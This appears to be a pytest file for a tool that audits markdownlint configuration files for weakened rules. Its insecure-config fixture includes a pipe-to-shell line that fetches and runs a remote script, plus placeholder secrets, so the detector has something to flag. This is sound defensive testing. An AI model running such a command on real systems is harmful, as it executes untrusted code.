"""Tests for MarkdownlintAnalyzer."""

from pathlib import Path

from devai.markdownlint_analyzer import MarkdownlintAnalyzer, MarkdownlintFinding

HARDENED_CONFIG = """\
{
  "default": true,
  "MD013": {
    "line_length": 120
  },
  "MD033": {
    "allowed_elements": []
  },
  "MD045": true,
  "ignores": ["node_modules"]
}
"""

INSECURE_CONFIG = """\
{
  "default": false,
  "MD033": false,
  "MD045": 0,
  "MD034": "off",
  "MD024": false,
  "MD041": false,
  "MD046": false,
  "MD013": {
    "line_length": 500
  },
  "MD*": false,
  "ignores": ["security/*", "docs/compliance/**"],
  "api_key": "supersecret123",
  "AKIAIOSFODNN7EXAMPLE",
  "script": "curl http://example.com/install.sh | bash"
}
"""


class TestMarkdownlintAnalyzer:
    def test_detects_insecure_patterns(self, tmp_path: Path):
        (tmp_path / ".markdownlint.json").write_text(INSECURE_CONFIG, encoding="utf-8")
        analyzer = MarkdownlintAnalyzer(str(tmp_path))
        kinds = {f.kind for f in analyzer.analyze()}
        assert "default_disabled" in kinds
        assert "inline_html_disabled" in kinds
        assert "alt_text_disabled" in kinds
        assert "link_rule_disabled" in kinds
        assert "heading_rule_disabled" in kinds
        assert "structure_rule_disabled" in kinds
        assert "wildcard_rule_disable" in kinds
        assert "line_length_high" in kinds
        assert "ignore_sensitive_path" in kinds
        assert "hardcoded_secret" in kinds
        assert "curl_pipe_shell" in kinds
        assert analyzer.stats.config_files == 1

    def test_hardened_config_has_no_high_findings(self, tmp_path: Path):
        (tmp_path / ".markdownlint.json").write_text(HARDENED_CONFIG, encoding="utf-8")
        analyzer = MarkdownlintAnalyzer(str(tmp_path))
        findings = analyzer.analyze()
        high = [f for f in findings if f.severity == "high"]
        assert high == []
        assert analyzer.health_score() == 100.0

    def test_no_config_returns_full_score(self, tmp_path: Path):
        analyzer = MarkdownlintAnalyzer(str(tmp_path))
        assert analyzer.stats.config_files == 0
        assert analyzer.health_score() == 100.0
        assert "none found" in analyzer.summary()

    def test_finding_format(self):
        finding = MarkdownlintFinding(
            kind="inline_html_disabled",
            severity="high",
            message="test message",
            path=".markdownlint.json",
            lineno=3,
        )
        assert ".markdownlint.json:3" in finding.format()

    def test_to_context(self, tmp_path: Path):
        (tmp_path / ".markdownlint.json").write_text(HARDENED_CONFIG, encoding="utf-8")
        context = MarkdownlintAnalyzer(str(tmp_path)).to_context()
        assert "markdownlint config analysis" in context
        assert "health score" in context

    def test_yaml_config(self, tmp_path: Path):
        (tmp_path / ".markdownlint.yaml").write_text(
            "default: true\nMD033: false\n",
            encoding="utf-8",
        )
        analyzer = MarkdownlintAnalyzer(str(tmp_path))
        kinds = {f.kind for f in analyzer.analyze()}
        assert "inline_html_disabled" in kinds

    def test_package_json_config(self, tmp_path: Path):
        (tmp_path / "package.json").write_text(
            '{"name":"demo","markdownlint":{"MD033":false}}',
            encoding="utf-8",
        )
        analyzer = MarkdownlintAnalyzer(str(tmp_path))
        assert analyzer.stats.config_files == 1
        assert any(f.kind == "inline_html_disabled" for f in analyzer.analyze())

    def test_generate_hardened_template(self):
        template = MarkdownlintAnalyzer(".").generate_hardened_template()
        assert '"default": true' in template
        assert "MD033" in template
